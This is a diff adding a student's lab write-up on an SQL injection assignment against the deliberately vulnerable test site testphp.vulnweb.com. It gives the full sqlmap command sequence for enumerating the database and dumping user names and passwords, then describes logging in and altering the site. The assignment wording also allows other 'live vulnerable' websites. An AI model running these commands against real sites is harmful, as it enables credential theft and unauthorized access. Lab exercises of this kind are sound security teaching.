@@ -1,0 +1,35 @@
+Problem Statment: 
+In the assignment 1, you need to perform a SQL Injection attack. You will use SQLMap tool and http://www.vulnweb.com/ or any other use case of live vulnerable website.You can do your own creativity 
+and can conduct the attack using any other way / method / technique but the use of SQLMap within Kali Linux to conduct the attack is necessary for this assignment. 
+
+REQUIREMENTS: 
+I installed SQLMAP using the command "sudo apt install sqlmap" on my Kali Linux. I have also attached a screenshot of the succesful instalation of sqlmap on my kali linux.
+
+SQL INJECTION ATTACK:
+1) Firstly, I opened the Acuart domain http://vulnweb.com which was given to us in moodle i chose this one. we could also chose any other use case of live vulnerable website.
+
+2) Then in the next step we find a vunerable link. In this case the link is http://testphp.vulnweb.com/artists.php?artist=2
+
+3) Then in this step to locate the Database I ran the following command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 --dbs" basically this will scan the website and 
+tell us the database that is being used at the backend and the number of databases and their names. i have attached the screenshot for this command.
+
+4) In this step to locate the tables. I ran the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables". I used the name of the data base in the arguement -D (acuart) in the command. This returned 
+me the tables inside the database. In my case, a list of 8 tables were returned; "artists, carts, categ, featured, guestbook, pictures, products, users". i have also attached the screenshot for this command.
+
+5) Moving towards the next command. In this step I entered the name of the table we will be focusing on the users table and run the command
+"sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns". This command will show us all the columns in this table. i have also attached the screenshot for this command.
+
+6) Finally, now in the users table, we will dump all the data in the uname and pass by running two commands. i firstly run the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump"
+and after that i run the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump" this will dump all the data in that file to a csv file. After we have done that we will find that the 
+username and pasword to both be set to test. i have also attached the screenshot for this command.
+
+7) After i have executed the SQL Injection Attack succesfuly. I went to http://testphp.vulnweb.com/login.php and logged in using the information that i had obtained above. After logging in, I then changed the information 
+on the website and then took a screenshot which i have also attached. 
+
+8) To conclude, I can say that intotal i ran 5 commands which are as follows:
+   Command 1: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 --dbs
+   Command 2: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables
+   Command 3: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns
+   Command 4: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
+   Command 5: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump
+   
